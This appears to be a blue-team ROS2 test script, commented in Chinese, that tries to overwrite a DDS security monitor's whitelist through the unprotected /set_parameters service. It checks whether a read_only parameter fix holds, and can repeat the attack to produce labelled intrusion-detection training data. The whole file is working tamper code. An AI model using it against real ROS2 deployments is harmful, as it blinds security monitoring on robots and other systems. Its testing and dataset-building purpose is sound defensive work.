#!/usr/bin/env python3
"""攻擊 N14 — ros2 /set_parameters 改 monitor whitelist 永久隱身.

藍方自己預判的攻擊。ROS2 每個 node 預設都 expose /<node>/set_parameters service。
L1 攻擊者只需要在同 LAN 用 DDS service call 就能改參數，不需要 secret。

漏洞：
    monitor 用 self.declare_parameter('whitelist', [...]) 不加 read_only descriptor
    → /dds_security_monitor/set_parameters 接受任意 client 改 whitelist
    → attacker 把自己加進 whitelist → monitor 從此不會 alert 他

藍方修補：
    所有 monitor 安全敏感參數一律 ParameterDescriptor(read_only=True)
    /set_parameters 對 read_only param 會回 successful=False

驗證方式：
    試圖改 whitelist 為 ['attacker_only']
    若 success=True → 修補失敗
    若 success=False + reason 包含 'read-only' → 修補成功
"""
import signal
import sys
import time
import rclpy
from rclpy.node import Node
from rcl_interfaces.srv import SetParameters
from rcl_interfaces.msg import Parameter, ParameterValue, ParameterType

try:  # rclpy exposes RCLError under different paths across distros
    from rclpy._rclpy_pybind11 import RCLError
except ImportError:  # pragma: no cover - fallback for older rclpy
    RCLError = RuntimeError

_STOP = False


def _request_stop(_signum, _frame):
    """Terminate cleanly when the session orchestrator ends the attack phase."""
    global _STOP
    _STOP = True


class WhitelistHijacker(Node):

    def __init__(self):
        super().__init__('attacker_param_hijack')
        self._client = self.create_client(
            SetParameters, '/dds_security_monitor/set_parameters'
        )

    def try_overwrite_whitelist(self):
        if not self._client.wait_for_service(timeout_sec=5.0):
            self.get_logger().error('❌ 找不到 /dds_security_monitor/set_parameters service')
            return
        # 構造請求：把 whitelist 整個換成「只有 attacker_only_node」
        req = SetParameters.Request()
        p = Parameter()
        p.name = 'whitelist'
        v = ParameterValue()
        v.type = ParameterType.PARAMETER_STRING_ARRAY
        v.string_array_value = ['attacker_only_node']
        p.value = v
        req.parameters = [p]
        self.get_logger().error('☠️ 對 monitor 發 /set_parameters: whitelist = ["attacker_only_node"]')
        future = self._client.call_async(req)
        rclpy.spin_until_future_complete(self, future, timeout_sec=5.0)
        if not future.done():
            self.get_logger().error('❌ service call timeout')
            return
        results = future.result().results
        for r in results:
            if r.successful:
                self.get_logger().error(
                    f'✗✗✗ ATTACK SUCCEEDED — whitelist 已被改！monitor 從此看不見其他 attacker'
                )
            else:
                self.get_logger().warn(
                    f'✓ 修補成功 — set_parameters refused: {r.reason!r}'
                )


def main():
    # 可選 duration：不給 → 維持原本的單次驗證行為（向後相容）。
    #
    # 給了就在時限內反覆嘗試，理由是資料集標籤：firewall_lab 的 orchestrator
    # 把整個 attack phase [attack_start, attack_end] 標成攻擊區間。單次攻擊在
    # 長 duration 下會讓大部分安靜流量被標成 parameter_tamper，等於污染訓練
    # 資料。攻擊者反覆重試本來也比單次嘗試更接近真實行為。
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 0.0
    signal.signal(signal.SIGTERM, _request_stop)
    signal.signal(signal.SIGINT, _request_stop)
    rclpy.init()
    node = WhitelistHijacker()
    try:
        if duration <= 0.0:
            node.try_overwrite_whitelist()
        else:
            deadline = time.monotonic() + duration
            attempts = 0
            while not _STOP and rclpy.ok() and time.monotonic() < deadline:
                try:
                    node.try_overwrite_whitelist()
                except RCLError:
                    # orchestrator 在 duration 到期時送 SIGTERM，context 會在
                    # 迴圈中途失效。這是正常收尾，不是攻擊失敗；讓它變成
                    # traceback 會使 session 被 verifier 判為不可訓練。
                    break
                attempts += 1
                # 留間隔，避免退化成 parameter flood（那是 N19 的情境）。
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                slept = 0.0
                while slept < min(2.0, remaining) and not _STOP:
                    time.sleep(0.1)
                    slept += 0.1
            print(f'☠️ 竄改嘗試次數: {attempts}', flush=True)
    finally:
        time.sleep(1)
        node.destroy_node()
        if rclpy.ok():
            rclpy.shutdown()


if __name__ == '__main__':
    main()
